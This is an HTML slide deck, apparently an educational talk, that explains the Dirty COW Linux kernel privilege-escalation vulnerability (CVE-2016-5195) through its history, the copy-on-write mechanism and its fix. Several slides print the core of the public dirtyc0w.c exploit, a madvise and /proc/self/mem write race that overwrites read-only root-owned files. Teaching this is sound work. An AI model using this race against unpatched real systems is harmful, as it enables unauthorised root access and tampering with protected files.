<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Dirty Cow (CVE-2016-5195)</title><meta name="generator" content="Hovercraft! 1.0 http://regebro.github.com/hovercraft"></meta><meta name="author" content="BabuSubashChandar C"></meta><link rel="stylesheet" href="css/hovercraft.css" media="all"></link><link rel="stylesheet" href="css/impressConsole.css" media="all"></link><link rel="stylesheet" href="css/highlight.css" media="all"></link><link rel="stylesheet" href="dirty-cow.css" media="screen,projection"></link></head><body class="impress-not-supported"><div id="impress" data-transition-duration="1500" auto-console="true"><div class="step step-level-1" step="0" data-scale="10" id="title" data-rotate-x="0" data-rotate-y="0" data-rotate-z="0" data-x="0" data-y="0" data-z="0"><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"><h1 id="dirty-cow-issue"><strong>Dirty COW Issue</strong></h1><p>BabuSubashChandar C</p><p><a href="mailto:babusubashchandar@zilogic.com">babusubashchandar@zilogic.com</a></p><div class="notes"><p>Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability
in the Linux Kernel. An ancient bug, as per the words of Linus
Torvalds, recently fixed after several attacks found "in the
wild".</p></div></div><div class="step step-level-1" step="1" data-y="5000" data-scale="1" data-rotate-x="0" data-rotate-y="0" data-rotate-z="0" data-x="0" data-z="0"><h1 id="terminology">Terminology</h1><p>issue == bug == exploit == vulnerability</p></div><div class="step step-level-1" step="2" data-x="1400" data-y="5000" data-rotate-x="0" data-rotate-y="0" data-rotate-z="30" data-scale="1" data-z="0"><h1 id="who-found-this-bug">Who found this bug?</h1><ul><li>Phil Oester was a security researcher discovered this bug "in the wild".</li><li>Before him, Linus Torvalds found it.</li></ul></div><div class="step step-level-1" step="3" data-rotate-x="0" data-rotate-y="0" data-rotate-z="60" data-scale="1" data-x="2800" data-y="5000" data-z="0"><h1 id="when-was-it-found">When was it found?</h1><ul><li>First reported in 1st Aug 2005 by Linus Torvalds.</li><li>Recently by Phil Oester during an HTTP packet capture.</li></ul></div><div class="step step-level-1" step="4" id="affected" data-rotate-x="0" data-rotate-y="0" data-rotate-z="90" data-scale="1" data-x="4200" data-y="5000" data-z="0"><h1 id="are-we-affected">Are we affected?</h1><p><strong>Yes!</strong></p></div><div class="step step-level-1" step="5" id="fixed" data-rotate-x="0" data-rotate-y="0" data-rotate-z="120" data-scale="1" data-x="5600" data-y="5000" data-z="0"><h1 id="is-it-fixed">Is it fixed?</h1><p><strong>Yes!</strong></p><ul><li>On 18th Oct 2016, the bug was fixed.</li></ul><div class="line-block">Refer Dirty COW wiki for more details on Fixed Kernel versions.<br></br></div></div><div class="step step-level-1" step="6" data-rotate-x="0" data-rotate-y="0" data-rotate-z="150" data-scale="1" data-x="7000" data-y="5000" data-z="0"><h1 id="branding"><strong>Branding</strong></h1><img src="dirtycow.png" height="300"></img><ul><li>A logo for the bug.</li><li>Twitter page for the same.</li><li>An online shop.</li><li>A github account.</li></ul></div><div class="step step-level-1" step="7" id="what_is_dirty_cow_issue" data-rotate-x="0" data-rotate-y="0" data-rotate-z="180" data-scale="1" data-x="8400" data-y="5000" data-z="0"><h1 id="mooooooove-up"><strong>Mooooooove Up</strong></h1><ul><li>A normal user can level up to become a privileged user.</li><li>An attacker with an account in the system can hijack the system
without any permission problem.</li></ul><div class="notes"><ul><li>Dirty COW is a nickname of the privilege-escalation vulnerability
potentially allows any malicious code, to gain root-level access
and completely hijack the device.</li><li>The programming bug gets its name from the copy-on-write
mechanism in the Linux kernel.</li><li>The implementation of COW in Kernel had a flaw, the programs can
set up a race condition to tamper with what should be a read-only
root-owned executable mapped into memory.</li><li>This flaw can be exploited to take advantage on any device, which
includes android phones, whose base is Linux Kernel. Pandemic
across architectures.</li></ul></div></div><div class="step step-level-1" step="8" id="cow" data-rotate-x="0" data-rotate-y="0" data-rotate-z="210" data-scale="1" data-x="9800" data-y="5000" data-z="0"><h1 id="what-is-cow">What is COW?</h1><ul><li>Resource allocation optimization strategy.</li><li>Made multiple accesses to same resource possible.</li><li>Without the knowledge of the accessing parties.</li><li>Allows modification on private copy only when there is an attempt.</li><li>And it checks for the privileges of the accessing party.</li></ul><div class="notes"><ul><li>Consider a furniture showroom showcases a chair.</li><li>Two persons are asking for the chair.</li><li>Unless a person orders the chair, a copy of the chair will not be
created.</li><li>This is CoW and it is done automagically by OS.</li></ul></div></div><div class="step step-level-1" step="9" id="dirty_cow_explained" data-rotate-x="0" data-rotate-y="0" data-rotate-z="240" data-scale="1" data-x="11200" data-y="5000" data-z="0"><h1 id="dirty-cow-explained"><strong>Dirty COW Explained</strong></h1><ul><li>Kernel hole was exploited by injecting race condition.</li><li>Escalates the privilege of a normal user to write to a read-only file.</li><li>Anyone can write to a root file.</li></ul><div class="notes"><ul><li>Now consider one of the person is repeatedly ordering and
declining the order.</li><li>Now the showroom owner got crazy and gives away the chair to a
person who didn't pay for the chair.</li><li>This is exactly what happens in Dirty CoW.</li><li>The pages allocated via CoW are marked dirty and indicated to OS
as not needed. But the same has been written to the disk when
asked to write by creating another copy.</li></ul></div></div><div class="step step-level-1" step="10" id="demo" data-rotate-x="0" data-rotate-y="0" data-rotate-z="270" data-scale="1" data-x="12600" data-y="5000" data-z="0"><h1 id="demo"><strong>Demo</strong></h1><script type="text/javascript" src="https://asciinema.org/a/5k2dcyn60gnmonffb5l72jrap.js" id="asciicast-5k2dcyn60gnmonffb5l72jrap" async></script></div><div class="step step-level-1" step="11" data-rotate-x="0" data-rotate-y="0" data-rotate-z="300" data-scale="1" data-x="14000" data-y="5000" data-z="0"><h1 id="poc-of-exploit">PoC of Exploit</h1><ul><li>There are a lot of proof-of-concepts out in the internet to
demonstrate the exploit.</li><li>Ours is a read-only write exploit.</li></ul></div><div class="step step-level-1" step="12" data-rotate-x="0" data-rotate-y="0" data-rotate-z="330" data-scale="1" data-x="15400" data-y="5000" data-z="0"><h1 id="dirtyc0w-c-main-function">dirtyc0w.c | main function</h1><pre class="highlight code c"><span class="n">f</span><span class="o">=</span><span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">O_RDONLY</span><span class="p">);</span>
<span class="n">fstat</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
<span class="n">name</span><span class="o">=</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

<span class="n">map</span><span class="o">=</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span><span class="n">PROT_READ</span><span class="p">,</span><span class="n">MAP_PRIVATE</span><span class="p">,</span><span class="n">f</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"mmap %zx</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">map</span><span class="p">);</span>

<span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pth1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">madviseThread</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pth2</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">procselfmemThread</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

<span class="n">pthread_join</span><span class="p">(</span><span class="n">pth1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">pthread_join</span><span class="p">(</span><span class="n">pth2</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span></pre></div><div class="step step-level-1" step="13" data-rotate-x="0" data-rotate-y="0" data-rotate-z="360" data-scale="1" data-x="16800" data-y="5000" data-z="0"><h1 id="dirtyc0w-c-madvise-thread">dirtyc0w.c | madvise thread</h1><pre class="highlight code c"><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">100000000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
       <span class="n">c</span><span class="o">+=</span><span class="n">madvise</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="n">MADV_DONTNEED</span><span class="p">);</span>
<span class="p">}</span></pre></div><div class="step step-level-1" step="14" data-rotate-x="0" data-rotate-y="0" data-rotate-z="390" data-scale="1" data-x="18200" data-y="5000" data-z="0"><h1 id="dirtyc0w-c-procselfmem-thread">dirtyc0w.c | procselfmem thread</h1><pre class="highlight code c"><span class="kt">int</span> <span class="n">f</span><span class="o">=</span><span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/mem"</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>

<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">100000000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
       <span class="n">lseek</span><span class="p">(</span><span class="n">f</span><span class="p">,(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">map</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">);</span>
       <span class="n">c</span><span class="o">+=</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">str</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">));</span>
<span class="p">}</span></pre></div><div class="step step-level-1" step="15" id="running_apart" data-rotate-x="0" data-rotate-y="0" data-rotate-z="420" data-scale="1" data-x="19600" data-y="5000" data-z="0"><h1 id="running-apart">Running apart</h1><table cellpadding="0" cellspacing="0"><thead><tr><th><p>madivse thread</p></th><th><p>procselfmem thread</p></th></tr></thead><tbody><tr><td><p>madvise()</p></td><td><p>---</p></td></tr><tr><td><p>---</p></td><td><p>write()</p></td></tr><tr><td><p>madvise()</p></td><td><p>---</p></td></tr><tr><td><p>---</p></td><td><p>write()</p></td></tr><tr><td><p>madvise()</p></td><td><p>---</p></td></tr><tr><td><p>---</p></td><td><p>write()</p></td></tr><tr><td><p>...</p></td><td><p>...</p></td></tr></tbody></table></div><div class="step step-level-1" step="16" id="synchronised" data-rotate-x="0" data-rotate-y="0" data-rotate-z="450" data-scale="1" data-x="21000" data-y="5000" data-z="0"><h1 id="synchronised">Synchronised</h1><table cellpadding="0" cellspacing="0"><thead><tr><th><p>madivse thread</p></th><th><p>procselfmem thread</p></th></tr></thead><tbody><tr><td><p>madvise()</p></td><td><p>---</p></td></tr><tr><td><p>---</p></td><td><p>write()</p></td></tr><tr><td><p>madvise()</p></td><td><p>---</p></td></tr><tr><td><p>---</p></td><td><p>write()</p></td></tr><tr><td><p>---</p></td><td><p>write()</p></td></tr><tr><td><p>madvise()</p></td><td><p>write()</p></td></tr></tbody></table></div><div class="step step-level-1" step="17" data-rotate-x="0" data-rotate-y="0" data-rotate-z="480" data-scale="1" data-x="22400" data-y="5000" data-z="0"><h1 id="how-it-is-fixed">How it is fixed</h1><ul><li>By detecting the first COW using a flag in the Kernel code.</li></ul></div><div class="step step-level-1" step="18" data-rotate-x="0" data-rotate-y="0" data-rotate-z="510" data-scale="1" data-x="23800" data-y="5000" data-z="0"><h1 id="questions"><strong>Questions</strong></h1></div><div class="step step-level-1" step="19" id="references" data-rotate-x="0" data-rotate-y="0" data-rotate-z="540" data-scale="1" data-x="25200" data-y="5000" data-z="0"><h1 id="references">References</h1><ul><li><a href="https://dirtycow.ninja">https://dirtycow.ninja</a> - official website.</li><li><a href="http://www.theregister.co.uk/2016/10/21/linux_privilege_escalation_hole/">http://www.theregister.co.uk/2016/10/21/linux_privilege_escalation_hole/</a></li><li><a href="http://thehackernews.com/2016/10/linux-kernel-exploit.html">http://thehackernews.com/2016/10/linux-kernel-exploit.html</a></li><li><a href="https://www.martijnlibbrecht.nu/2/">https://www.martijnlibbrecht.nu/2/</a> - explanation of the PoC.</li></ul></div><div class="step step-level-1" step="20" id="followme" data-rotate-x="0" data-rotate-y="0" data-rotate-z="570" data-scale="1" data-x="26600" data-y="5000" data-z="0"><h1 id="follow-me"><strong>Follow me</strong></h1><div class="followme">
<table align="center">
<tr><td>
<i class="fa fa-linkedin-square"></i></td><td><p>&nbsp;&nbsp;babuenir</p></td></tr>
<tr><td><i class="fa fa-twitter"></i><td><p>&nbsp;&nbsp;@babuenir</p></td></tr>
<tr><td><i class="fa fa-github"></i><td><p>&nbsp;&nbsp;babuenir</p></td></tr></table></div></div></div><div id="hovercraft-help" class="hide"><table><tr><th>Space</th><td>Forward</td></tr><tr><th>Right, Down, Page Down</th><td>Next slide</td></tr><tr><th>Left, Up, Page Up</th><td>Previous slide</td></tr><tr><th>P</th><td>Open presenter console</td></tr><tr><th>H</th><td>Toggle this help</td></tr></table></div><script type="text/javascript" src="js/impress.js"></script><script type="text/javascript" src="js/impressConsole.js"></script><script type="text/javascript" src="js/hovercraft.js"></script></body></html>